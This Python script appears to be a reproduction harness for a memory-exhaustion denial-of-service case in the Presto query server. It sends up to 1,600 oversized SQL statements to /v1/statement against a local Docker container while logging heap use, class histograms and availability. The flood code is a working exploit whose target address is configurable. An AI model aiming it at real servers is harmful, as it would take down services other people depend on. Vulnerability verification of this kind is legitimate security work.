#!/usr/bin/env python3
import json
import os
import re
import subprocess
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path


CASE_DIR = Path(__file__).resolve().parent
LOG_DIR = CASE_DIR / "logs"
EVIDENCE_DIR = CASE_DIR / "evidence"
CONTAINER = os.environ.get("PRESTO_CONTAINER", "dos-presto-prestodb-presto-static-0001")
BASE_URL = os.environ.get("PRESTO_BASE_URL", "http://127.0.0.1:18080")

REQUEST_CAP = int(os.environ.get("PRESTO_PROBE_REQUEST_CAP", "1600"))
BODY_BYTES = int(os.environ.get("PRESTO_PROBE_BODY_BYTES", "700000"))
BATCH_SIZE = int(os.environ.get("PRESTO_PROBE_BATCH_SIZE", "25"))
WAIT_AFTER_SECONDS = int(os.environ.get("PRESTO_PROBE_WAIT_AFTER_SECONDS", "330"))
HTTP_TIMEOUT = float(os.environ.get("PRESTO_PROBE_HTTP_TIMEOUT", "10"))
STOP_DOCKER_MEM_MIB = float(os.environ.get("PRESTO_PROBE_STOP_DOCKER_MEM_MIB", "1900"))

EVENTS_PATH = LOG_DIR / "probe_events.jsonl"
RESPONSES_PATH = LOG_DIR / "responses_sample.jsonl"
SUMMARY_PATH = EVIDENCE_DIR / "probe_summary.json"


def now():
    return time.strftime("%Y-%m-%dT%H:%M:%S%z")


def append_jsonl(path, obj):
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("a", encoding="utf-8") as f:
        f.write(json.dumps(obj, sort_keys=True) + "\n")


def run_cmd(args, timeout=30):
    try:
        proc = subprocess.run(args, text=True, capture_output=True, timeout=timeout)
        return {
            "returncode": proc.returncode,
            "stdout": proc.stdout,
            "stderr": proc.stderr,
        }
    except subprocess.TimeoutExpired as exc:
        return {
            "returncode": 124,
            "stdout": exc.stdout or "",
            "stderr": exc.stderr or f"timeout after {timeout}s",
        }


def docker_running():
    result = run_cmd(["docker", "inspect", "-f", "{{.State.Running}}", CONTAINER], timeout=10)
    return result["returncode"] == 0 and result["stdout"].strip() == "true"


def docker_exit_info():
    result = run_cmd(
        [
            "docker",
            "inspect",
            "-f",
            "{{.State.Status}} {{.State.ExitCode}} {{.State.OOMKilled}} {{.State.Error}}",
            CONTAINER,
        ],
        timeout=10,
    )
    return result["stdout"].strip() if result["returncode"] == 0 else result["stderr"].strip()


def parse_mem_to_mib(text):
    match = re.search(r"([0-9.]+)\s*([KMGT]i?B)", text)
    if not match:
        return None
    value = float(match.group(1))
    unit = match.group(2)
    factors = {
        "KB": 1 / 1024,
        "KiB": 1 / 1024,
        "MB": 1,
        "MiB": 1,
        "GB": 1024,
        "GiB": 1024,
        "TB": 1024 * 1024,
        "TiB": 1024 * 1024,
    }
    return value * factors[unit]


def docker_stats():
    result = run_cmd(["docker", "stats", "--no-stream", "--format", "{{json .}}", CONTAINER], timeout=15)
    if result["returncode"] != 0:
        return {"error": result["stderr"].strip()}
    try:
        data = json.loads(result["stdout"])
    except json.JSONDecodeError:
        data = {"raw": result["stdout"].strip()}
    if "MemUsage" in data:
        data["mem_usage_mib"] = parse_mem_to_mib(data["MemUsage"])
    return data


def jvm_pid():
    result = run_cmd(["docker", "exec", CONTAINER, "jcmd"], timeout=15)
    if result["returncode"] != 0:
        return None
    for line in result["stdout"].splitlines():
        if "com.facebook.presto.server.PrestoServer" in line:
            return line.split()[0]
    return None


def capture_heap(label):
    pid = jvm_pid()
    if not pid:
        return {"label": label, "error": "jvm_pid_not_found"}
    result = run_cmd(["docker", "exec", CONTAINER, "jcmd", pid, "GC.heap_info"], timeout=30)
    path = LOG_DIR / f"jcmd_heap_{label}.txt"
    path.write_text(result["stdout"] + result["stderr"], encoding="utf-8")
    used_k = None
    match = re.search(r"garbage-first heap\s+total\s+\d+K,\s+used\s+(\d+)K", result["stdout"])
    if match:
        used_k = int(match.group(1))
    return {"label": label, "path": str(path.relative_to(CASE_DIR)), "heap_used_k": used_k, "returncode": result["returncode"]}


def capture_histogram(label):
    pid = jvm_pid()
    if not pid:
        return {"label": label, "error": "jvm_pid_not_found"}
    result = run_cmd(["docker", "exec", CONTAINER, "jcmd", pid, "GC.class_histogram"], timeout=90)
    target_lines = []
    for line in result["stdout"].splitlines():
        if "QueuedStatementResource" in line or "HttpRequestSessionContext" in line:
            target_lines.append(line)
    path = LOG_DIR / f"class_histogram_{label}.txt"
    path.write_text("\n".join(target_lines) + "\n", encoding="utf-8")
    parsed = {}
    for line in target_lines:
        parts = line.split()
        if len(parts) >= 4:
            cls = parts[3]
            try:
                parsed[cls] = {"instances": int(parts[1]), "bytes": int(parts[2])}
            except ValueError:
                pass
    return {"label": label, "path": str(path.relative_to(CASE_DIR)), "classes": parsed, "returncode": result["returncode"]}


def availability():
    try:
        with urllib.request.urlopen(BASE_URL + "/v1/info", timeout=3) as resp:
            body = resp.read(4096).decode("utf-8", errors="replace")
            return {"ok": True, "status": resp.status, "body": body}
    except Exception as exc:
        return {"ok": False, "error": repr(exc)}


def make_statement(i):
    prefix = f"SELECT 'dos_probe_{i:06d}_"
    suffix = "'"
    filler_len = max(1, BODY_BYTES - len(prefix.encode()) - len(suffix.encode()))
    return prefix + ("A" * filler_len) + suffix


def submit_statement(i):
    statement = make_statement(i)
    req = urllib.request.Request(
        BASE_URL + "/v1/statement",
        data=statement.encode("utf-8"),
        method="POST",
        headers={
            "X-Presto-User": "dos_probe",
            "Content-Type": "text/plain",
            "Connection": "close",
        },
    )
    started = time.time()
    try:
        with urllib.request.urlopen(req, timeout=HTTP_TIMEOUT) as resp:
            data = resp.read(8192)
            elapsed = time.time() - started
            parsed = {}
            try:
                parsed = json.loads(data)
            except json.JSONDecodeError:
                parsed = {"raw_prefix": data[:256].decode("utf-8", errors="replace")}
            return {
                "ok": True,
                "status": resp.status,
                "elapsed_seconds": elapsed,
                "id": parsed.get("id"),
                "has_next_uri": bool(parsed.get("nextUri")),
                "body_bytes": len(statement.encode("utf-8")),
            }
    except urllib.error.HTTPError as exc:
        elapsed = time.time() - started
        body = exc.read(512).decode("utf-8", errors="replace")
        return {"ok": False, "status": exc.code, "elapsed_seconds": elapsed, "error": body}
    except Exception as exc:
        elapsed = time.time() - started
        return {"ok": False, "status": None, "elapsed_seconds": elapsed, "error": repr(exc)}


def checkpoint(label, include_histogram=False):
    stats = docker_stats()
    heap = capture_heap(label) if docker_running() else {"label": label, "error": "container_not_running"}
    hist = capture_histogram(label) if include_histogram and docker_running() else None
    event = {
        "ts": now(),
        "event": "checkpoint",
        "label": label,
        "docker_running": docker_running(),
        "docker_exit_info": docker_exit_info(),
        "availability": availability(),
        "docker_stats": stats,
        "heap": heap,
        "histogram": hist,
    }
    append_jsonl(EVENTS_PATH, event)
    return event


def main():
    LOG_DIR.mkdir(parents=True, exist_ok=True)
    EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)
    for path in [EVENTS_PATH, RESPONSES_PATH, SUMMARY_PATH]:
        if path.exists():
            path.unlink()

    summary = {
        "case_id": "prestodb__presto-PRESTO-APP-STATIC-0001",
        "container": CONTAINER,
        "base_url": BASE_URL,
        "request_cap": REQUEST_CAP,
        "body_bytes": BODY_BYTES,
        "batch_size": BATCH_SIZE,
        "wait_after_seconds": WAIT_AFTER_SECONDS,
        "stop_docker_mem_mib": STOP_DOCKER_MEM_MIB,
        "started_at": now(),
        "submitted": 0,
        "failure": None,
        "checkpoints": [],
    }

    first = checkpoint("baseline_probe", include_histogram=True)
    summary["checkpoints"].append(first["label"])
    if not first["availability"]["ok"]:
        summary["failure"] = {"kind": "service_not_ready", "details": first["availability"]}
        SUMMARY_PATH.write_text(json.dumps(summary, indent=2, sort_keys=True), encoding="utf-8")
        return 2

    last_ok = None
    for i in range(1, REQUEST_CAP + 1):
        if not docker_running():
            summary["failure"] = {"kind": "container_stopped", "exit_info": docker_exit_info(), "at_request": i}
            append_jsonl(EVENTS_PATH, {"ts": now(), "event": "container_stopped", "at_request": i, "exit_info": docker_exit_info()})
            break

        result = submit_statement(i)
        summary["submitted"] = i if result["ok"] else i - 1
        if i <= 5 or i % BATCH_SIZE == 0 or not result["ok"]:
            append_jsonl(RESPONSES_PATH, {"ts": now(), "request_index": i, **result})
        if result["ok"]:
            last_ok = result
        else:
            summary["failure"] = {"kind": "http_submit_failed", "at_request": i, "details": result, "exit_info": docker_exit_info()}
            append_jsonl(EVENTS_PATH, {"ts": now(), "event": "http_submit_failed", "request_index": i, "result": result, "exit_info": docker_exit_info()})
            break

        if i % BATCH_SIZE == 0:
            include_hist = i in {25, 50, 100, 200, 400, 600, 800, 1000, 1200, 1400, 1600}
            cp = checkpoint(f"after_{i}", include_histogram=include_hist)
            summary["checkpoints"].append(cp["label"])
            mem_mib = cp.get("docker_stats", {}).get("mem_usage_mib")
            if mem_mib is not None and mem_mib >= STOP_DOCKER_MEM_MIB:
                summary["failure"] = {"kind": "safety_memory_stop", "at_request": i, "docker_mem_mib": mem_mib}
                append_jsonl(EVENTS_PATH, {"ts": now(), "event": "safety_memory_stop", "request_index": i, "docker_mem_mib": mem_mib})
                break
            if not cp["availability"]["ok"]:
                time.sleep(10)
                unavailable_again = availability()
                if not unavailable_again["ok"]:
                    summary["failure"] = {
                        "kind": "sustained_unavailable",
                        "at_request": i,
                        "first": cp["availability"],
                        "second": unavailable_again,
                        "exit_info": docker_exit_info(),
                    }
                    append_jsonl(EVENTS_PATH, {"ts": now(), "event": "sustained_unavailable", "request_index": i, "second": unavailable_again, "exit_info": docker_exit_info()})
                    break

    if summary["failure"] is None:
        append_jsonl(EVENTS_PATH, {"ts": now(), "event": "request_cap_reached", "submitted": summary["submitted"], "last_ok": last_ok})
        wait_start = time.time()
        while time.time() - wait_start < WAIT_AFTER_SECONDS:
            if not docker_running():
                summary["failure"] = {"kind": "container_stopped_during_wait", "exit_info": docker_exit_info()}
                break
            remaining = WAIT_AFTER_SECONDS - (time.time() - wait_start)
            if remaining <= 0:
                break
            time.sleep(min(30, remaining))
            label = f"wait_{int(time.time() - wait_start)}s"
            cp = checkpoint(label, include_histogram=False)
            summary["checkpoints"].append(cp["label"])
            if not cp["availability"]["ok"]:
                time.sleep(10)
                unavailable_again = availability()
                if not unavailable_again["ok"]:
                    summary["failure"] = {
                        "kind": "sustained_unavailable_during_wait",
                        "first": cp["availability"],
                        "second": unavailable_again,
                        "exit_info": docker_exit_info(),
                    }
                    break
        if docker_running():
            cp = checkpoint("after_wait_final", include_histogram=True)
            summary["checkpoints"].append(cp["label"])

    summary["ended_at"] = now()
    summary["docker_exit_info"] = docker_exit_info()
    summary["docker_running"] = docker_running()
    summary["final_availability"] = availability()
    SUMMARY_PATH.write_text(json.dumps(summary, indent=2, sort_keys=True), encoding="utf-8")
    return 0


if __name__ == "__main__":
    sys.exit(main())
